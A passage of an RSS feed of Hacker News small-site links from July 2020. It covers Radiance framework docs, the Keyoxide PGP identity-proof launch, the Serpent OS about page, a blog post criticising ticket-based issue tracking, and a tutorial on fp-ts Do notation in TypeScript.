href="#FUNCTION%20RADIANCE-CORE%3ASERVE-FILE">serve-file</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST-RUN-TIME">request-run-time</a></code>, <code><a href="#VARIABLE%20RADIANCE-CORE%3A%2ADEBUGGER%2A">*debugger*</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AHANDLE-CONDITION">handle-condition</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3ARENDER-ERROR-PAGE">render-error-page</a></code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AEXECUTE-REQUEST">execute-request</a></code>, <code>set-data</code>, <code><a href="#FUNCTION%20RADIANCE-CORE%3AREQUEST">request</a></code></p> <h3 id="1.3_route">1.3 Route</h3> <p>Before a Request can be dispatched on, it goes through something called the routing system. Unlike in other frameworks, where 'routes' designate what handles a request, in Radiance a Route (<code><a href="#FUNCTION%20RADIANCE-CORE%3AROUTE">route</a></code>) is a form of URI translator. This part of the system is what's responsible for creating and upholding two "universes", an internal and an external one.</p> <p>The internal universe is the one actual web applications live in. The external universe is the one the HTTP server and a user of the website lives in. This distinction is necessary in order to allow you to, one one hand, write web applications without having to worry about what a potential setup on a server might look like at some point. You don't have to worry about what kind of domain, port, path setup may be necessary to run your application. On the other hand, it allows you, as a webadmin, to customise and run the system to your exact desires without fear of breaking things.</p> <p>This all is facilitated by routes, of which there are two kinds: mapping, and reversal routes. Mapping routes are responsible for turning a URI from the external universe into one of the internal universe. Usually this involves cutting away the top-level domain and perhaps doing a mapping of subdomains. Reversal routes do the opposite-- they go from the internal universe to the external. This is necessary in order to make links in your served pages refer to …</p></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shirakumo.github.io/radiance/">https://shirakumo.github.io/radiance/</a></em></p>]]>
            </description>
            <link>https://shirakumo.github.io/radiance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699984</guid>
            <pubDate>Wed, 01 Jul 2020 10:37:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launching Keyoxide.org]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23699821">thread link</a>) | @todsacerdoti
<br/>
July 1, 2020 | https://yarmo.eu/post/keyoxide | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/keyoxide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, I'm excited to launch <a href="https://keyoxide.org/">Keyoxide.org</a>, the lightweight and FOSS solution to make basic cryptography operations accessible to regular humans.</p>
<h2>What is Keyoxide.org?</h2>
<p><a href="https://keyoxide.org/">Keyoxide.org</a> offers easy encryption, signature verification and decentralized identity proof verification based on PGP keys while demanding little in-depth knowledge about the underlying encryption program from its users.</p>
<p>This project aims to offer comparable functionality as services like <a href="https://keybase.io/">Keybase</a> while reducing friction and being more open.</p>
<p>The project is MIT licensed, uses <a href="https://github.com/openpgpjs/openpgpjs">openpgpjs</a> and is hosted on <a href="https://codeberg.org/yarmo/keyoxide">Codeberg</a>.</p>
<h2>Why only encryption and signature verification?</h2>
<p>These are the operations that are available when only having access to public keys instead of private keys. If you wish to decrypt messages and sign them, you need a keypair. If you have a keypair, you probably have the knowledge to use dedicated tools like the CLI or Kleopatra. And if you do, you probably won't be using <a href="https://keyoxide.org/">Keyoxide.org</a> directly yourself.</p>
<p>Indeed, if you possess a PGP keypair, <a href="https://keyoxide.org/">Keyoxide.org</a> is the tool you send to others to interact with your public key more easily. Allow them to encrypt a message for you, to verify one of your signatures, to verify your online identities using decentralized proofs.</p>
<h2>What are those decentralized identity proofs you keep mentioning?</h2>
<p>You know how Keybase allows you to prove you have control over accounts on certain websites and services? A great function! Fortunately for you, this function can be even better and more secure by using <a href="https://keyoxide.org/guides/openpgp-proofs">decentralized OpenPGP identity proofs</a>. <a href="https://keyoxide.org/">Keyoxide.org</a> will prove your identity on multiple platforms at the same time and yet, you are not required to make an account to use this function. How is that possible?</p>
<p>Well, it's called <em>decentralized</em> for a reason: <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't hold your proofs, your key does! Any software that can access your public key can verify these proofs for anyone. When better tooling comes around, you could verify those proofs using a mobile app, using a command-line utility, you name it. No single service holds your proof, only you do, stored inside your keypair.</p>
<p>I have written a <a href="https://keyoxide.org/guides">guide</a> on how to add a proof for every platform currently supported by this website: <a href="https://keyoxide.org/guides/dns">domains</a>, <a href="https://keyoxide.org/guides/lobsters">Lobste.rs</a>, <a href="https://keyoxide.org/guides/twitter">Twitter</a>, <a href="https://keyoxide.org/guides/github">Github</a>, a <a href="https://keyoxide.org/guides">bunch more</a> and work is in progress to support even more still. Is your beloved service not in the list? <a href="https://codeberg.org/yarmo/keyoxide">Open an issue or make a PR</a>! Free open-source software FTW!</p>
<p>Oh, that reminds me, any <a href="https://keyoxide.org/guides/mastodon">Mastodon</a> instance can be used to prove your identity. Yes, <a href="https://github.com/keybase/keybase-issues/issues/3385">any</a>.</p>
<h2>So how does it compare to Keybase?</h2>
<p>There's a more complete <a href="https://keyoxide.org/guides/feature-comparison-keybase">guide on the Keyoxide website</a>, but in a nutshell:</p>
<ul>
<li>more privacy-friendly by not forcing you to create an account and handing over data</li>
<li>more secure by not asking you to trust the service with your private keys</li>
<li>open-source servers (<a href="https://github.com/keybase/client/issues/24105">a must</a>)</li>
<li>encrypt/verify with every public key accessible on the internet, not just those that have been uploaded to a proprietary server</li>
<li>almost all processing is done in the browser, no data is sent to servers*</li>
<li>no vendor lock-in</li>
<li>selfhostable</li>
</ul>
<p>* Only exception is decentralized identity proof verification: some service providers do not have the correct CORS headers (like Reddit) or require APIs (like Twitter). In these rare cases, simple PHP scripts (also open-source) run the proof verification instead.</p>
<h2>Can I get an account?</h2>
<p>No. <a href="https://keyoxide.org/">Keyoxide.org</a> doesn't need your data on its servers. There are already several ways of exposing public keys on the internet, including <a href="https://keyoxide.org/guides/web-key-directory">web key directory</a> (WKD) and dedicated servers like <a href="https://keys.openpgp.org/">keys.openpgp.org</a>. Let's use those instead of making yet another service where you need to upload your keys to.</p>
<h2>Can I get a profile page then?</h2>
<p>Yes! Append your PGP fingerprint or WKD id to the URL and there it is!</p>
<p>Want an example? Here's  my profile at<br>
<a href="https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d">https://keyoxide.org/9f0048ac0b23301e1f77e994909f6bd6f80f485d</a>.</p>
<p>Now you know what accounts on various services are mine, where to follow me if you wish to get updates on the project and if you wish to send me an encrypted message, that's also just two clicks away.</p>
<h2>What about my private keys?</h2>
<p>Don't upload your private keys to the internet, period. If a service wants your private keys on their (proprietary) servers, say no.</p>
<h2>You said selfhostable?</h2>
<p>Well, yes! It's not a fully supported use case just yet, but the browser does all the processing, the server is mostly just there to deliver the files to the user to perform the operations. <a href="https://codeberg.org/yarmo/keyoxide">Grab the code</a> and put it on your own PHP server!</p>
<h2>Any closing words?</h2>
<p>I built this to provide better tooling around modern-day encryption programs and reduce the friction for less tech-savvy people when interacting with public keys.</p>
<p>For those who wish to use encryption programs beyond OpenPGP, <a href="https://codeberg.org/yarmo/keyoxide/issues">let's talk about this</a>. Keyoxide doesn't have any reference to PGP in its name for a reason: it could serve as a platform for easy interaction with any public key, no matter the underlying encryption program.</p>
<p>And above all, I hope you see the same benefit and potential in <a href="https://keyoxide.org/">Keyoxide.org</a> as I do and would like to see it grow as an open and accessible platform to push forward the democratization of online privacy and security.</p>
<p>Privacy is not a luxury.</p>
<p>Many thanks to <a href="https://metacode.biz/@wiktor">Wiktor</a> for helping with the decentralized identity proofs.</p></div></div>]]>
            </description>
            <link>https://yarmo.eu/post/keyoxide</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699821</guid>
            <pubDate>Wed, 01 Jul 2020 10:07:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serpent Musl/Linux]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23699808">thread link</a>) | @anticensor
<br/>
July 1, 2020 | https://www.serpentos.com/about/ | <a href="https://web.archive.org/web/*/https://www.serpentos.com/about/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

            
        </article>
    </div>
</div></div>]]>
            </description>
            <link>https://www.serpentos.com/about/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699808</guid>
            <pubDate>Wed, 01 Jul 2020 10:05:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Museum of Digital Art forced to close its doors]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23699764">thread link</a>) | @dsr12
<br/>
July 1, 2020 | https://muda.co/closing/ | <a href="https://web.archive.org/web/*/https://muda.co/closing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://muda.co/closing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699764</guid>
            <pubDate>Wed, 01 Jul 2020 09:59:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How issue tracking hurts product development]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23699581">thread link</a>) | @gauthamshankar
<br/>
July 1, 2020 | https://zepel.io/blog/how-issue-tracking-hurts-development/ | <a href="https://web.archive.org/web/*/https://zepel.io/blog/how-issue-tracking-hurts-development/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>The short answer is yes. Let me explain.</p><p>I’ve been working with developers and designers my entire life. </p><p>I’ve built a couple of products, worked at a young startup, and I’m now at Zepel helping development teams build better software.</p><p>I’ve spoken to 1000+ development teams while at Zepel alone. <strong>And it's evident that the way we build products is broken.</strong></p><p>There’s so much disconnect between how you and I talk about building products and how our teams actually build them.</p><p>For all the talk of scrum and agile and getting feedback quickly, there’s so much that’s broken in how we act on the feedback and build the feature.</p><p>Teams spend so much time and effort getting a deeper understanding of customers’ needs. And yet distil everything down to a simple two-line ticket and a couple of lines of markdown description.</p><p>This is hurting your developers. And it’s hurting your business.</p><blockquote>Nothing is more frustrating than having to understand what an entire feature should or shouldn’t do from a two-line ticket filled with ten bullet points of acceptance criteria.</blockquote><p><em>*Here are five prioritized tickets for the upcoming sprint. We have to ship them on time!*</em></p><p>On the other hand, you have teams who are able to build top quality software. They’re the ones who can concentrate on the fine implementation details without losing focus on the broader purpose of the feature as a whole.</p><p>Everyone wants to get to that level. But instead, teams do the exact opposite.</p><p><strong>Teams think in issues and tickets, instead of the feature as a system.</strong></p><hr><h2 id="development-teams-are-not-ticket-movers-">Development teams are not ticket movers!</h2><p>Today, everything is about moving a ticket from “Todo” to “Done” as quick as possible. And watching burndown charts. And customizing the tool to the extent that the developer only views a single ticket.</p><p><em>*“What’s the velocity of our team?” is simply another way of asking how quickly can my team move an issue from “Todo” to “Done”.*</em></p><p>Pieces of that stuff are important for productivity and shipping on time.</p><p>But seriously, how is your team supposed to ship anything of value if you narrow their focus down to the smallest unit of work without any context of why it’s needed or how it connects to the whole feature?!</p><p>Overall, we’ve lost our way. Product development today has become more about checking items off a list as quickly as possible. </p><p><strong>It isn’t enough to write multiple user stories and share a Figma link if you want to ship quality software.</strong></p><hr><h2 id="how-software-product-teams-really-build-software-together">How software product teams really build software together</h2><p>Development teams build better software together when they have the complete context of what and why something is being built.</p><p>To achieve this, the foundational elements need to change.</p><p>And it starts with getting the right abstractions and naming conventions.</p><p><strong>The names you choose determine the perception and the quality of conversations you have. </strong>It’s why top developers spend time obsessing over names for classes, functions, and variables.</p><p>When you open up a VS Code and see a function called <code>send_signup_email</code>, you have a certain sense of what’s going to be inside and why that’s there.</p><p>The right abstractions can drive the team towards asking the right questions. And this is critical.</p><p><strong>Because when you’re tracking issues and tickets in isolation you have no choice but to measure only outputs.</strong></p><p>And teams today don’t want to measure only the outputs. They want to measure <em>outcomes</em>.</p><hr><h2 id="what-s-the-right-abstraction">What’s the right abstraction?</h2><p>The right abstraction is the one that prioritizes people over processes and tools. It's the one you and I use every day — it's Features.</p><p>When a squad creates a Feature and opens it, they’ll get to look at the entire feature as a unit. A user story inside it might describe a specific functionality. But the difference is, now each developer and designer know how it connects to the larger scheme of things for the entire feature.</p><blockquote>A feature forces inept managers to stop focussing on output-oriented questions like “how can we work faster”. <p>And shifts the focus on outcome-oriented questions like “why should we prioritize this feature” and “how does this feature tie to the OKR”.</p></blockquote><p>Miscellaneous tasks and incoming bugs can be tracked on a separate “List”, so high-priority bugs don't get missed out. And of course, when it comes to tracking them, they can all be tracked on a Sprint or on a Kanban Board.</p><p><strong>Feature as an abstraction is the right middle ground that lets you focus on the output as well as the outcome.</strong> It lets you zoom in and track what's happening today. It also allows you to zoom out and track a feature's progress across multiple disciplines. And it enables you to see how a feature moves from a feature request all the way to prioritization and development.</p><p>Simple issue trackers and project management tools have shoehorned teams into ticket-movers and have made them think in outputs. Metrics get feigned to show productivity. Thinking in outcomes has become ridiculously hard. And it's hurting businesses.</p><p>It's time for tools to reflect the reality of product development. It's time to remove the disconnect between development teams and what your customers really want. </p><p>It's time to stop thinking in isolated tickets and start thinking in features as a system!</p><hr><p>If you liked what you read, I think you’ll love what we have in store for you. Go ahead and <a href="https://zepel.io/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=product-development-is-broken">try Zepel for free</a>.</p>
                </div>
            </section></div>]]>
            </description>
            <link>https://zepel.io/blog/how-issue-tracking-hurts-development/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699581</guid>
            <pubDate>Wed, 01 Jul 2020 09:27:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Approximating Haskell's do syntax in TypeScript]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23699385">thread link</a>) | @allenleein
<br/>
July 1, 2020 | https://paulgray.net/do-syntax-in-typescript/ | <a href="https://web.archive.org/web/*/https://paulgray.net/do-syntax-in-typescript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="a-doomed-pyramid"><a href="#a-doomed-pyramid">A Doomed Pyramid</a></h2><p>The pyramid of doom is a problem that's plagued callbacks/promises since they were introduced to the Javascript language. If you've used fp-ts for any length of time, you've probably noticed that this problem isn't specific to asynchronous code. For example, this expression which sums three optional numbers:</p><div data-language="ts">
      <pre><code>option<span>.</span><span>chain</span><span>(</span>maybeA<span>,</span> <span>a</span> <span>=&gt;</span>
  option<span>.</span><span>chain</span><span>(</span>maybeB<span>,</span> <span>b</span> <span>=&gt;</span>
    option<span>.</span><span>map</span><span>(</span>maybeC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>This, of course looks similar to how we'd deal with fetching numbers from some external service:</p><div data-language="ts">
      <pre><code>fetchA<span>.</span><span>then</span><span>(</span><span>a</span> <span>=&gt;</span>
  fetchB<span>.</span><span>then</span><span>(</span><span>b</span> <span>=&gt;</span> 
    fetchC<span>.</span><span>then</span><span>(</span><span>c</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Also, suppose these numbers were stored in either values, and we wanted to compute the sum, or return early with an error:</p><div data-language="ts">
      <pre><code>either<span>.</span><span>chain</span><span>(</span>errorOrA<span>,</span> <span>a</span> <span>=&gt;</span>
  either<span>.</span><span>chain</span><span>(</span>errorOrB<span>,</span> <span>b</span> <span>=&gt;</span>
    either<span>.</span><span>map</span><span>(</span>errorOrC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>Note: You may have noticed that we could have used something like <code>Promise.all</code> to combine all of our fetched numbers. In this case, it's true (disregarding the fact that <code>all</code> executes in parallel), however, as soon as we need to use the output of the previously chained value as input to the next, we're back to nesting <code>chain</code>s.</p><p>JavaScript has added async await syntax, which helps avoid this problem for promises:</p><div data-language="ts">
      <pre><code><span>const</span> a <span>=</span> <span>await</span> fetchA<span>;</span>
<span>const</span> b <span>=</span> <span>await</span> fetchB<span>;</span>
<span>const</span> c <span>=</span> <span>await</span> fetchC<span>;</span>

<span>return</span> a <span>+</span> b <span>+</span> c<span>;</span></code></pre>
      </div><p>This is nice, but it only works for promises; it won't work for option chains, either chains, or any other chainable. It would be nice if we had something like this that would work for <em>all</em> chainable (monad) values.</p><p>This pattern happens quite often in functional programming, and certain fp languages even have special syntax sugar for expressing chains like these in a succinct manner, such as Haskell's <a href="https://en.wikibooks.org/wiki/Haskell/do_notation">do notation</a>, or Scala's <a href="https://docs.scala-lang.org/tour/for-comprehensions.html">for comprehension</a>. There have been a few attempts to mimic this syntax in JS. One popular way is to use generators. Generators don't work for all monads, and they have poor typescript support. It would be nice to have something that works with typescript, and supports all monads.</p><p><code>Do</code> is an attempt at this. It uses the builder pattern to collect the successful value from each chainable, and stores them in an object. At each successive step, the result of any chainable from previous values in the chain is accessible, making it possible to prevent nested callback situations, which can help make code clearer.</p><h3 id="do-for-option"><a href="#do-for-option">Do for Option:</a></h3><p>Let's get a feel for how <code>Do</code> works by using it with the previous examples:</p><p>Here we have 3 <code>Option</code> values each chained successively:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> option<span>,</span> Option <span>}</span> <span>from</span> <span>'fp-ts/lib/Option'</span>
<span>const</span> maybeA<span>:</span> Option<span>&lt;</span><span>number</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>const</span> maybeB<span>:</span> Option<span>&lt;</span><span>number</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>const</span> maybeC<span>:</span> Option<span>&lt;</span><span>number</span><span>&gt;</span> <span>=</span> <span>...</span>

option<span>.</span><span>chain</span><span>(</span>maybeA<span>,</span> <span>a</span> <span>=&gt;</span>
  option<span>.</span><span>chain</span><span>(</span>maybeB<span>,</span> <span>b</span> <span>=&gt;</span>
    option<span>.</span><span>map</span><span>(</span>maybeC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>The <code>Do</code> equivalent of this snippet is:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> Do <span>}</span> <span>from</span> <span>'fp-ts-contrib/lib/Do'</span>

<span>const</span> result <span>=</span> 
  <span>Do</span><span>(</span>option<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"a"</span><span>,</span> maybeA<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"b"</span><span>,</span> maybeB<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"c"</span><span>,</span> maybeC<span>)</span>
    <span>.</span><span>return</span><span>(</span><span>(</span><span><span>{</span>a<span>,</span> b<span>,</span> c<span>}</span></span><span>)</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span></code></pre>
      </div><p>At each <code>bind</code> step, we're passing an identifier, and an <code>Option&lt;number&gt;</code> value. Each step will only continue on if the previous value was present. Finally, the last return statement, the provided values at <code>a</code>, <code>b</code>, and <code>c</code>, are each <code>number</code>s. The function here can be used to transform the result value. Remember, each step only gets invoked if all of the previous options were defined. For example, let's say that <code>maybeA</code>'s  value was <code>some(5)</code>, <code>maybeB</code>'s value was <code>none</code>, and <code>maybeC</code>'s value was <code>some(6)</code>. The <code>Do</code> chain would stop at the second step, and the result of the entire <code>Do</code> expression would be <code>none</code>.</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>option<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"a"</span><span>,</span> <span>some</span><span>(</span><span>5</span><span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"b"</span><span>,</span> none<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"c"</span><span>,</span> <span>some</span><span>(</span><span>6</span><span>)</span><span>)</span>
    <span>.</span><span>return</span><span>(</span><span>(</span><span><span>{</span>a<span>,</span> b<span>,</span> c<span>}</span></span><span>)</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>
    
result </code></pre>
      </div><p>If all of the values were defined, then we'd reach the <code>return</code>, and the result of the expression would be <code>some(sum)</code>, where <code>sum</code> is the value returned by the <code>return</code> function:</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>option<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"a"</span><span>,</span> <span>some</span><span>(</span><span>5</span><span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"b"</span><span>,</span> <span>some</span><span>(</span><span>2</span><span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"c"</span><span>,</span> <span>some</span><span>(</span><span>6</span><span>)</span><span>)</span>
    <span>.</span><span>return</span><span>(</span><span>(</span><span><span>{</span>a<span>,</span> b<span>,</span> c<span>}</span></span><span>)</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>
    
result </code></pre>
      </div><h3 id="do-for-either"><a href="#do-for-either">Do for Either</a></h3><p>When using <code>Do</code> with <code>Either</code> values it behaves similarly to <code>Option</code>. Each step will only continue if the value it encounters is a <code>right</code> value. If a <code>left</code> value is encountered, the whole chain "short-circuits," and returns with that left value.</p><p>Here's a snippet of code that doesn't use <code>Do</code>:</p><div data-language="ts">
      <pre><code><span>import</span> <span>{</span> either<span>,</span> Either <span>}</span> <span>from</span> <span>'fp-ts/lib/Either'</span>
<span>const</span> errorOrA<span>:</span> Either<span>&lt;</span><span>string</span><span>,</span> <span>number</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>const</span> errorOrB<span>:</span> Either<span>&lt;</span><span>string</span><span>,</span> <span>number</span><span>&gt;</span> <span>=</span> <span>...</span>
<span>const</span> errorOrC<span>:</span> Either<span>&lt;</span><span>string</span><span>,</span> <span>number</span><span>&gt;</span> <span>=</span> <span>...</span>

either<span>.</span><span>chain</span><span>(</span>errorOrA<span>,</span> <span>a</span> <span>=&gt;</span>
  either<span>.</span><span>chain</span><span>(</span>errorOrB<span>,</span> <span>b</span> <span>=&gt;</span>
    either<span>.</span><span>map</span><span>(</span>errorOrC<span>,</span> <span>c</span> <span>=&gt;</span>
      a <span>+</span> b <span>+</span> c
    <span>)</span>
  <span>)</span>
<span>)</span></code></pre>
      </div><p>And here's that same snippet, with <code>Do</code>:</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>either<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"a"</span><span>,</span> errorOrA<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"b"</span><span>,</span> errorOrB<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"c"</span><span>,</span> errorOrC<span>)</span>
    <span>.</span><span>return</span><span>(</span><span>(</span><span><span>{</span>a<span>,</span> b<span>,</span> c<span>}</span></span><span>)</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span></code></pre>
      </div><p>As stated, if we encounter a left value at any point in the chain, the whole chain will fallback with that left value (since that is the behavior of <code>either</code>'s <code>chain</code> function):</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>either<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"a"</span><span>,</span> <span>right</span><span>(</span><span>5</span><span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"b"</span><span>,</span> <span>left</span><span>(</span><span>"error getting b"</span><span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"c"</span><span>,</span> <span>right</span><span>(</span><span>10</span><span>)</span><span>)</span>
    <span>.</span><span>return</span><span>(</span><span>(</span><span><span>{</span>a<span>,</span> b<span>,</span> c<span>}</span></span><span>)</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>

result </code></pre>
      </div><p>If every value is right, then we'll reach the end, however, if we encounter a left value at any point in the chain, the whole chain will fallback with that left value:</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>either<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"a"</span><span>,</span> <span>right</span><span>(</span><span>5</span><span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"b"</span><span>,</span> <span>left</span><span>(</span><span>"error getting b"</span><span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"c"</span><span>,</span> <span>right</span><span>(</span><span>10</span><span>)</span><span>)</span>
    <span>.</span><span>return</span><span>(</span><span>(</span><span><span>{</span>a<span>,</span> b<span>,</span> c<span>}</span></span><span>)</span> <span>=&gt;</span> a <span>+</span> b <span>+</span> c<span>)</span>

result </code></pre>
      </div><p>The <code>Do</code> function takes an instance of a Monad typeclass, which handles the chaining of the values that you pass as the second parameter to <code>bind</code>. The type of the typeclass instance also determines the <em>type</em> of values you will be able to chain. For instance, <code>Do(option)</code> will enable you to chain <code>Option</code> values (since <code>option</code>'s type is <code>Monad1&lt;"Option"&gt;</code>'). <code>Do(either)</code> will enable you to chain <code>Either</code> values (since <code>either</code>'s type is <code>Monad2&lt;"Either"&gt;</code>). The value returned from <code>Do</code> is a builder that will let you create chains of these monads.</p><h2 id="bind"><a href="#bind">.bind</a></h2><p><code>.bind</code> takes a <code>string</code> identifier, and an instance of the contextual monad. It will extract the "inner" value from the monad and assign it to a context object, which will make it available in subsequent methods:</p><div data-language="ts">
      <pre><code><span>Do</span><span>(</span>option<span>)</span>
  <span>.</span><span>bind</span><span>(</span><span>"user"</span><span>,</span> <span>some</span><span>(</span><span>{</span>name<span>:</span> <span>"Bob"</span><span>,</span> age<span>:</span> <span>54</span><span>}</span><span>)</span><span>)</span>
  <span>.</span><span>return</span><span>(</span><span>context</span> <span>=&gt;</span> <span>{</span>
    context<span>.</span>user 
  <span>}</span><span>)</span></code></pre>
      </div><p>The builder will maintain every key, adding each value to it's context object.
Note that in the <code>return</code> function, <code>context.user</code>'s and <code>context.manager</code>'s types are <code>User</code>, not <code>Option&lt;User&gt;</code>. <code>bind</code> "extracts" the values for us, in the same way that <code>async</code> "extracts" the value out of a promise.</p><div data-language="ts">
      <pre><code><span>Do</span><span>(</span>option<span>)</span>
